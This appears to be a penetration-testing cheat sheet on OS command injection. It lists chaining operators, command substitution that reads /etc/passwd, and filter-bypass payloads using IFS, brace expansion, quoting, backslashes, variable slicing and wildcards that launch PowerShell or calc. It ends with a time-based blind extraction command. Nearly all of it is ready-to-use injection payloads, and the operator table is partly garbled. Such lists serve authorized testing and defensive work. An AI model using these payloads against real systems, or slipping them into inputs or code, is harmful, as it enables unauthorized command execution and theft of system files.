# Command Injection

## <mark style="color:red;">Command Chaining</mark> <a href="#command-chaining" id="command-chaining"></a>

```sh
<input>; ls
<input>& ls
<input>&& ls
<input>| ls
<input>|| ls
```

{% hint style="info" %}
Also try:

* Prepending a flag or parameter.
* Removing spaces (`<input>;ls`).
{% endhint %}

#### Chaining Operators <a href="#chaining-operators" id="chaining-operators"></a>

Windows and Unix supported.

|       | Syntax          | Description                                      |
| ----- | --------------- | ------------------------------------------------ |
| `%0A` | `cmd1 %0A cmd2` | Newline. Executes both.                          |
| `;`   | `cmd1 ; cmd2`   | Semi-colon operator. Executes both.              |
| `&`   | `cmd1 & cmd2`   | Runs command in the background. Executes both.   |
| \`    | \`              | \`cmd1                                           |
| `&&`  | `cmd1 && cmd2`  | AND operator. Executes `cmd2` if `cmd1` succeds. |
| \`    |                 | \`                                               |

## <mark style="color:red;">I/O Redirection</mark> <a href="#io-redirection" id="io-redirection"></a>

```sh
> /var/www/html/output.txt
< /etc/passwd
```

## <mark style="color:red;">Command Substitution</mark> <a href="#command-substitution" id="command-substitution"></a>

Replace a command output with the command itself.

```sh
<input> `cat /etc/passwd`
```

```sh
<input> $(cat /etc/passwd)
```

## <mark style="color:red;">Filter Bypassing</mark> <a href="#filter-bypassing" id="filter-bypassing"></a>

### <mark style="color:blue;">Space filtering</mark> <a href="#space-filtering-spaceless-ifs" id="space-filtering-spaceless-ifs"></a>

**Linux**

```sh
cat</etc/passwd
# bash
${cat,/etc/passwd}
cat${IFS}/etc/passwd
v=$'cat\x20/etc/passwd'&&$v
IFS=,;`cat<<<cat,/etc/passwd`
```

**Windows**

```ps
ping%CommonProgramFiles:~10,-18%IP
ping%PROGRAMFILES:~10,-5%IP
```

### <mark style="color:blue;">Slash (</mark><mark style="color:blue;">`/`</mark><mark style="color:blue;">) filtering</mark> <a href="#slash--filtering" id="slash--filtering"></a>

```sh
echo ${HOME:0:1} # /
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

```sh
echo . | tr '!-0' '"-1' # /
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```

### <mark style="color:blue;">Command filtering</mark> <a href="#command-filtering" id="command-filtering"></a>

Quotes.

```sh
w'h'o'am'i
w"h"o"am"i
```

Slash.

```sh
w\ho\am\i
/\b\i\n/////s\h
```

At symbol.

```sh
who$@ami
```

Variable expansion.

```sh
v=/e00tc/pa00sswd
cat ${v//00/}
```

Wildcards.

```ps
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

## <mark style="color:red;">Time Based Data Exfiltration</mark> <a href="#time-based-data-exfiltration-time-based-rce" id="time-based-data-exfiltration-time-based-rce"></a>

```sh
time if [ $(uname -a | cut -c1) == L ]; then sleep 5; fi
```
